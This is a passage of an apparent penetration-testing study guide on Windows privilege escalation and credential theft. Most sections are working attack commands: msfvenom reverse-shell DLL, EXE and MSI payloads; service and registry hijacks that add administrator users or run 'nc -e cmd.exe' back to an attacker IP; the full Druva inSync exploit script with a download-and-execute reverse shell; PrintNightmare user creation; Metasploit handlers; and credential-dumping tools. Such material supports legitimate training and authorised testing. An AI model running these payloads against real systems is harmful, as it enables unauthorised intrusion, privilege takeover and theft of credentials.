The level **0x5** is the highest level, which means **Always notify** is enabled. There are fewer UAC bypasses at this highest level. Let's examine the build of Windows we're looking to elevate on:
```console
PS C:\zeropio> [environment]::OSVersion.Version
```

With the return code, we can check it [here](https://en.wikipedia.org/wiki/Windows_10_version_history). Now we can search in the Github [UACME](https://github.com/hfiref0x/UACME), and search for our current version.

Let's see for a Windows 10 build 14393. According to UACME, is the technique 54. This technique targets the 32-bit version of the auto-elevating binary SystemPropertiesAdvanced.exe. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt. The 32-bit version of **SystemPropertiesAdvanced.exe** attempts to load the non-existent DLL **srrstr.dll**, which is used by System Restore functionality. When attempting to locate a DLL, Windows will use the following search order:
1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32`{: .filepath} for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System`{: .filepath} (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

Let's examine the path variable:
```console
PS C:\zeropio> cmd /c echo %PATH%
```

We can potentially bypass UAC in this by using DLL hijacking by placing a malicious srrstr.dll DLL to WindowsApps folder, which will be loaded in an elevated context. Generate the DLL:
```console
zero@pio$ msfvenom -p windows/shell_reverse_tcp LHOST=<OUR IP> LPORT=8443 -f dll > srrstr.dll
```

Download the malicious payload and start a netcat. If we execute the malicious **srrstr.dll** file, we will receive a shell back showing normal user rights (UAC enabled), run **rundll32.exe** to get a reverse shell connection:
```console
C:\zeropio> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Now, we can execute the 32-bit version of **SystemPropertiesAdvanced.exe** from the target host:
```console
C:\zeropio> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

This is successful, and we receive an elevated shell that shows our privileges are available and can be enabled if needed.

## Weak Permissions 

Permissions on Windows systems are complicated and challenging to get right.

### Permissive File System ACLs

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs:
```console
PS C:\zeropio> .\SharpUp.exe audit
```

The tool identifies the **PC Security Management Service** (for example), which executes the **SecurityService.exe** binary when started. Using `icacls` we can verify:
```console
PS C:\zeropio> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

We can replace it now with a msfvenom payload:
```console
C:\zeropio> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\zeropio> sc start SecurityService
```

### Weak Service Permissions 

We can see a misconfigured program after running SharpUp. We can verify it with [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk):
```console
C:\zeropio> accesschk.exe /accepteula -quvcw WindscribeService
```

Check the admin group to confirm that our user is not in them:
```console
C:\zeropio> net localgroup administrators
```

We can use our permissions to change the binary path maliciously:
```console
C:\zeropio> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

Next, we must stop the service, so the new binpath command will run the next time it is started:
```console
C:\zeropio> sc stop WindscribeService
```

Since we have full control over the service, we can start it again, and the command we placed in the binpath will run even though an error message is returned:
```console
C:\zeropio> sc start WindscribeService
```

Finally, check to confirm that our user was added to the local administrators group:
```console
C:\zeropio> net localgroup administrators
```

We can clean up after ourselves and ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable. Reverted the binary path:
```console
C:\zeropio> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

Star the service again:
```console
C:\zeropio> sc start WindScribeService
```

Verify is running:
```console
C:\zeropio> sc query WindScribeService
```

### Unquoted Service Path 

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Using the following path:
```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied. 
```console
C:\zeropio> sc qc SystemExplorerHelpService
```

If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service:
- `C:\Program.exe\`{: .filepath}
- `C:\Program Files (x86)\System.exe`{: .filepath}

We can identify unquoted service binary paths using the command below:
```console
C:\zeropio> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Permissive Registry ACLs 

It is also worth searching for weak service ACLs in the Windows Registry. We can do this using **accesschk**:
```console
C:\zeropio> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

...
RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS
```

We can abuse this using the PowerShell cmdlet Set-ItemProperty to change the ImagePath value, using a command such as:
```console
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe <OUR IP> 443"
```

### Modifiable Registry Autorun Binary

We can use WMIC to see what programs run at system startup.
```console
PS C:\zeropio> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

Check [here](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries) for potential autorun locations on Windows systems.

## Kernel Exploits 

It's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. [Here](https://msrc.microsoft.com/update-guide/vulnerability) are a list of Microsoft security vulnerabilities. Below are some extremely high-impact Windows vulnerabilities over the years that can be leveraged to escalate privileges:
- **MS08-067**: remote code execution vulnerability in the "Server" service due to improper handling of RPC requests
- **MS17-010**: Also known as EternalBlue is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the Shadow Brokers leak
- **ALPC Task Scheduler 0-Day**: The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to **.job** files located in the `C:\Windows\tasks`{: .filepath} directory
- **CVE-2021-36934 HiveNightmare** (**SeriousSam**):  Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level

### Notable Vulnerabilities

We can check for this vulnerability using icacls to check permissions on the SAM file:
```console
C:\zeropio> icacls c:\Windows\System32\config\SAM
```

If the **BUILTIN\Users** group is include we can read it. Most Windows 10 systems will have System Protection enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw. Let's use the following [PoC](https://github.com/cube0x0/CVE-2021-36934):
```console
PS C:\htb> .\CVE-2021-36934.exe
```

Also, we can try with **Spooler Service**. We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a *path does not exist* error:
```console
PS C:\zeropio> ls \\localhost\pipe\spoolss
```

First start by bypassing the execution policy on the target host:
```console
PS C:\zeropio> Set-ExecutionPolicy Bypass -Scope Process 

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

Now we can import the [PowerShell script](https://github.com/calebstewart/CVE-2021-1675) and use it to add a new local admin user:
```console
PS C:\zeropio> Import-Module .\CVE-2021-1675.ps1
PS C:\zeropio> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

Confirm that we have created the user:
```console
PS C:\zeropio> net user hacker
```

### Enumerating Missing Patches

We can examine the installed updates in several ways:
```console
PS C:\zeropio> systeminfo
PS C:\zeropio> wmic qfe list brief
PS C:\zeropio> Get-Hotfix
```

```console
C:\zeropio> wmic qfe list brief
```

### CVE-2020-0668 Example 

Let's verify our current user's privileges:
```console
C:\zeropio> whoami /priv
```

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit.  Building the solution should create the following files:
- `CVE-2020-0668.exe`{: .filepath}
- `CVE-2020-0668.exe.config`{: .filepath}
- `CVE-2020-0668.pdb`{: .filepath}
- `NtApiDotNet.dll`{: .filepath}
- `NtApiDotNet.xml`{: .filepath}

This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. `icacls` confirms it:
```console
C:\zeropio> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Let's generate a malicious maintenanceservice.exe:
```console
zero@pio$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<OUR IP> LPORT=8443 -f exe > maintenanceservice.exe
```

Copy it in two files:
```console
PS C:\zeropio> wget http://<OUR IP>/maintenanceservice.exe -O maintenanceservice.exe
PS C:\zeropio> wget http://<OUR IP>/maintenanceservice.exe -O maintenanceservice2.exe
```

Let's run the exploit. It accepts two arguments, the source and destination files:
```console
C:\zeropio> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\user\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

The exploit runs and executing icacls again:
```console
C:\zeropio> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```

We can overwrite the **maintenanceservice.exe** binary in `c:\Program Files (x86)\Mozilla Maintenance Service`{: .filepath} with a good working copy of our malicious binary created earlier before proceeding to start the service. Let's move the good copy that was not corrupted by the exploit **maintenanceservice2.exe** to the Program Files directory, making sure to rename the file properly and remove the 2 or the service won't start:
```console
C:\zeropio> copy /Y C:\Users\user\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Next, save the below commands to a Resource Script file named **handler.rc**:
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

Launch Metasploit with that settings:
```console
zero@pio$ sudo msfconsole -r handler.rc 
```

Start the service, and we should get a session as **NT AUTHORITY\SYSTEM**.

## Vulnerable Services

We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. As covered previously, let's start by enumerating installed applications to get a lay of the land:
```console
C:\zeropio> wmic product get name
```

Take for example the *Druva inSync* program. Enumerate local ports, to check where the suspicious target is running:
```console
C:\zeropio> netstat -ano
```

After finding the process ID (**PID**):
```console
PS C:\zeropio> get-process -Id 3324
```

One last check about the program:
```console
PS C:\zeropio> get-service | ? {$_.DisplayName -like 'Druva*'}
```

With this information in hand, let's try out the exploit PoC about Druva inSync:
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

For our purposes, we want to modify the **$cmd** variable to our desired command. Download this [script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Open the file, and append the following at the bottom of the script file:
```
Invoke-PowerShellTcp -Reverse -IPAddress <OUR IP> -Port 9443
```

Modify the **$cmd** variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory:
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<OUR IP>/shell.ps1')"
```

Start a http server, open a netcat and execute the payload.

---

# Credential Theft

## Credential Hunting 

Credentials can unlock many doors for us during our assessments.  We can use the `findstr` utility to search for this sensitive information:
```console
PS C:\zeropio> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Sensitive IIS information such as credentials may be stored in a `web.config`{: .filepath} file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`{: .filepath}.

### Dictionary Files

Another interesting case is dictionary files. The user may add these words to their dictionary to avoid the distracting red underline:
```console
PS C:\zeropio> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml`{: .filepath} are stored in plaintext or base64 encoded. Although these files should be automatically deleted as part of the installation, sysadmins may have created copies.

### PowerShell History File

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file: `C:\Users\username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`{: .filepath}

Confirming PowerShell history save path:
```console
PS C:\zeropio> (Get-PSReadLineOption).HistorySavePath
```

Once we know the file's location, we can attempt to read its contents using `gc`:
```console
PS C:\zeropio> gc (Get-PSReadLineOption).HistorySavePath
```

We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user:
```console
PS C:\zeropio> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### PowerShell Credentials

The credentials are protected using **DPAPI**, which typically means they can only be decrypted by the same user on the same computer they were created on. Take, for example, the following script **Connect-VC.ps1**, which a sysadmin has created to connect to a vCenter server easily:
```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString
```

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from **encrypted.xml**:
```console
PS C:\zeropio> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\zeropio> $credential.GetNetworkCredential().username
PS C:\zeropio> $credential.GetNetworkCredential().password
```

## Other Files 

There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. We can use [Snaffler](https://github.com/SnaffCon/Snaffler) to find file with extensions like **.kdbx**, **.vmdk**, **.vdhx**, **.ppk**, ...

### Manually Searching  

We can search the file system or share drive(s) manually using the following commands from this [cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-a-file-with-a-certain-filename):
```console
C:\zeropio> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
C:\zeropio> findstr /si password *.xml *.ini *.txt *.config
C:\zeropio> findstr /spin "password" *.*
PS C:\zeropio> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
C:\zeropio> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
C:\zeropio> where /R C:\ *.config
PS C:\zeropio> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
PS C:\zeropio> dir C:\ /s /b | find "<FILE>" | findstr"<FILE>"
```

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`{: .filepath}:
```console
PS C:\zeropio> ls 

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

We can copy the three **plum.sqlite...** and use a tool like [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the **Text** column in the Note table with the query `select Text from Note;`. This can also be done with PowerShell using the PSSQLite module.
```console
PS C:\zeropio> Set-ExecutionPolicy Bypass -Scope Process 

A  

PS C:\zeropio> cd .\PSSQLite\
PS C:\zeropio> Import-Module .\PSSQLite.psd1
PS C:\zeropio> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\zeropio> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

We can also copy them over to our attack box and search through the data using the `strings` command:
```console
zero@pio$ strings plum.sqlite-wal
```

Some other files we may find credentials in include the following:
- `%SYSTEMDRIVE%\pagefile.sys`{: .filepath}
- `%WINDIR%\debug\NetSetup.log`{: .filepath}
- `%WINDIR%\repair\sam`{: .filepath}
- `%WINDIR%\repair\system`{: .filepath}
- `%WINDIR%\repair\software, %WINDIR%\repair\security`{: .filepath}
- `%WINDIR%\iis6.log`{: .filepath}
- `%WINDIR%\system32\config\AppEvent.Evt`{: .filepath}
- `%WINDIR%\system32\config\SecEvent.Evt`{: .filepath}
- `%WINDIR%\system32\config\default.sav`{: .filepath}
- `%WINDIR%\system32\config\security.sav`{: .filepath}
- `%WINDIR%\system32\config\software.sav`{: .filepath}
- `%WINDIR%\system32\config\system.sav`{: .filepath}
- `%WINDIR%\system32\CCM\logs\*.log`{: .filepath}
- `%USERPROFILE%\ntuser.dat`{: .filepath}
- `%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat`{: .filepath}
- `%WINDIR%\System32\drivers\etc\hosts`{: .filepath}
- `C:\ProgramData\Configs\*`{: .filepath}
- `C:\Program Files\Windows PowerShell\*`{: .filepath}

## Further Credential Theft 

### Cmdkey Saved Credentials 

The `cmdkey` command can be used to create, list, and delete stored usernames and passwords:
```console
C:\zeropio> cmdkey /list
```

We can run commands as other user with `runas`:
```console
PS C:\zeropio> runas /savecred /user:<USER> <COMMAND>
```

### Browser Credentials 

We can use a tool like [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI):
```console
PS C:\zeropio> .\SharpChrome.exe logins /unprotect
```

### Password Managers 

Extracting KeePass hash with **keepass2john.py**:
```console
zero@pio$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

Now we can use the 13400 mode from hashcat:
```console
zero@pio$ hashcat -m 13400 keepass_hash <WORDLIST>
```

### Email

We can use some tool like [MailSniper](https://github.com/dafthack/MailSniper).

### LaZagne 

[This](https://github.com/AlessandroZ/LaZagne) tool could help us:
```console
PS C:\zeropio> .\lazagne.exe all
```

### SessionGopher

[This](https://github.com/Arvanaghi/SessionGopher) tool extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials:
```console
PS C:\htb> .\SessionGopher.ps1
PS C:\Tools> Invoke-SessionGopher -Target <COMPUTER NAME>
```

### Wifi Passwords 

If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to:
```console
C:\zeropio> netsh wlan show profile
```

Depending on the network configuration, we can retrieve the pre-shared key:
```console
C:\zeropio> netsh wlan show profile <USER PROFILE> key=clear
```

---

# Additional Techniques 

## Interacting with Users 

If Wireshark is installed, unprivileged users may be able to capture network traffic. If Wirehsark is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up. We can also use the [net-creds](https://github.com/DanMcInerney/net-creds). 

When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script:
```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

We can host the script on our attack machine and execute it on the target host as follows:
```console
PS C:\zeropio> IEX (iwr 'http//<OUR IP>/procmon.ps1') 
```

A **Shell Command File** (**SCF**) is used by Windows Explorer to move up and down directories, show the Desktop, ... In this example, let's create the following file and name it something like **@Inventory.scf** (`@` make the file at the top of the directory):
```
[Shell]
Command=2
IconFile=\\<OUR IP>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Start the Responder:
```console
zero@pio$ sudo responder -wrf -v -I tun0
```

We could then attempt to crack the password hash offline using Hashcat to retrieve the cleartext:
```console
zero@pio$ hashcat -m 5600 hash <WORDLIST>
```

## Miscellaneous Techniques 

### Living Off The Land Binaries and Scripts (LOLBAS) 

The [LOLBAS project](https://lolbas-project.github.io/) documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. For example [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), which we can use to download files:
```console
PS C:\zeropio> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

We can use the `-encode` flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system:
```console
C:\zeropio> certutil -encode file1 encodedfile
```

Once the new file has been created, we can use the `-decode` flag to decode the file:
```console
C:\zeropio> certutil -decode encodedfile file2
```

A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file.


### Always Install Elevated 

This setting can be set via Local Group Policy by setting **Always install with elevated privileges** to Enabled under the following paths:
- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`{: .filepath}
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`{: .filepath}

Let's enumerate this setting:
```console
PS C:\zeropio> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
PS C:\zeropio> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

We can exploit this by generating a malicious MSI:
```console
zero@pio$ msfvenom -p windows/shell_reverse_tcp lhost=<OUR IP> lport=9443 -f msi > aie.msi
```

We can upload this MSI file to our target, start a Netcat listener and execute the file:
```console
C:\zeropio> msiexec /i c:\aie.msi /quiet /qn /norestart
```

If all goes to plan, we will receive a connection back as **NT AUTHORITY\SYSTEM**.

### Scheduled Tasks 

We can use the `schtasks` command to enumerate scheduled tasks on the system:
```console
C:\zeropio>  schtasks /query /fo LIST /v
```

We can also enumerate scheduled tasks using the `Get-ScheduledTask` PowerShell cmdlet:
```console
PS C:\zeropio> Get-ScheduledTask | select TaskName,State
```

Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\Windows\System32\Tasks`{: .filepath}, which standard users do not have read access to. 

### User/Computer Description Field

We can enumerate this quickly for local users using the `Get-LocalUser` cmdlet:
```console
PS C:\zeropio> Get-LocalUser
```

We can also enumerate the computer description field via PowerShell using the `Get-WmiObject` cmdlet with the **Win32_OperatingSystem** class:
```console
PS C:\zeropio> Get-WmiObject -Class Win32_OperatingSystem | select Description
```

### Mount VHDX/VMDK 

[Snaffler](https://github.com/SnaffCon/Snaffler) can help us finding special files inside shared folders. Three specific file types of interest are **.vhd**, **.vhdx**, and **.vmdk** files. These are Virtual Hard Disk, Virtual Hard Disk v2, and Virtual Machine Disk. We can mount them as:
```console
zero@pio$ guestmount -a <NAME>.vmdk -i --ro /mnt/vmdk
```

```console
zero@pio$ guestmount --add <NAME>.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

In Windows, we can right-click on the file and choose **Mount**, or use the **Disk Management** utility to mount a **.vhd** or **.vhdx** file. If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config`{: .filepath}:
```console
zero@pio$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

# End of Life Systems

Over time, Microsoft decides to no longer offer ongoing support for specific operating system versions. [This](https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/) page has a detail list of end-of-life (EOL) for Microsoft Windows. 

## Windows Server 

Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. Let's first use WMI to check for missing KBs:
```console
C:\zeropio> wmic qfe
```

Let's run Sherlock to gather more information:
```console
PS C:\htb> Set-ExecutionPolicy bypass -Scope process

... Y

PS C:\zeropio> Import-Module .\Sherlock.ps1
PS C:\zeropio> Find-AllVulns
```

Search for the CVE we encounter. For example, we can use the `smb_delivery` Metasploit module:
```console
msf6 > use exploit/windows/smb/smb_delivery
msf6 exploit(windows/smb/smb_delivery) > show options
msf6 exploit(windows/smb/smb_delivery) > show targets
msf6 exploit(windows/smb/smb_delivery) > set target 0
```

Open a cmd console on the target host and paste in the `rundll32.exe` command:
```console
C:\zeropio> rundll32.exe \\<OUR IP>\lEUZam\test.dll,0
```

We get a call back quickly. We can use the [CVE-2010-3888 and CVE-2010-3388](https://www.exploit-db.com/exploits/19930):
```console
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
msf6 exploit(windows/smb/smb_delivery) use 0
```

Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process:
```console
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <PID>
meterpreter > bg
```

Once this is set, we can now set up the privilege escalation module by specifying our current Meterpreter session:
```console
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
msf6 exploit(windows/local/ms10_092_schelevator) > set lhost <OUR IP>
msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443
```

If all goes to plan, once we type exploit, we will receive a new Meterpreter shell as the **NT AUTHORITY\SYSTEM**.

## Windows Desktop Versions 

Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Desktop. We can use the [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). To install it:
```console
zero@pio$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
zero@pio$ sudo tar -xf setuptools-2.0.tar.gz; cd setuptools-2.0/; sudo python2.7 setup.py install 

zero@pio$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
zero@pio$ sudo tar -xf xlrd-1.0.0.tar.gz; cd xlrd-1.0.0/; sudo python2.7 setup.py install;
```

Once this is done, we need to capture the `systeminfo` command's output and save it to a text file on our attack VM:
```console
C:\zeropio> systeminfo
```

We then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file:
```console
zero@pio$ sudo python2.7 windows-exploit-suggester.py --update
```

Once this is done, we can run the tool against the vulnerability database to check for potential privilege escalation flaws:
```console
zero@pio$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
```

In the case of a Meterpreter we can use the `post/multi/recon/local_exploit_suggestor` module.



---

# Resources 

| **Link**   | **Description**    |
|--------------- | --------------- |
| [SeatBelt](https://github.com/GhostPack/Seatbelt) | is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives |
| [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) | Privilege Escalation Awesome Scripts SUITE |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations |
| [SharUp](https://github.com/GhostPack/SharpUp) | a C# port of various PowerUp functionality |
| [JAWS](https://github.com/411Hall/JAWS) | Just Another Windows (Enum) Script |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally |
| [Watson](https://github.com/rasta-mouse/Watson) | Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities |
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Credentials recovery project |
| [WES-NG](https://github.com/bitsadmin/wesng) | Windows Exploit Suggester - Next Generation |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) | like [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) or [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |
| [Juicy Potato](https://github.com/ohpe/juicy-potato) | another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM |
| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | Abusing Impersonation Privileges on Windows 10 and Server 2019 |
| [RoguePotato](https://github.com/antonioCoco/RoguePotato) | Another Windows Local Privilege Escalation from Service Account to System |
| [mimikatz](https://github.com/gentilkiwi/mimikatz) | A little tool to play with Windows security |
| [UACME](https://github.com/hfiref0x/UACME) | Defeating Windows User Account Control |
| [EoPLaodDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) | Proof of concept for abusing SeLoadDriverPrivilege |
| [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) | Weaponizing privileged file writes with the Update Session Orchestrator service |
| [DiagHub](https://github.com/xct/diaghub) | Loads a custom dll in system32 via diaghub |
| [Snaffler](https://github.com/SnaffCon/Snaffler) | a tool for pentesters to help find delicious candy |
| [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) | a C# port of some Mimikatz DPAPI functionality |
| [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) | This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target |



> We can find some pre-compiled binaries for **Seatbelt** and **SharUp** [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) and for **LaZagne** [here](https://github.com/AlessandroZ/LaZagne/releases/)
{: .prompt-info}




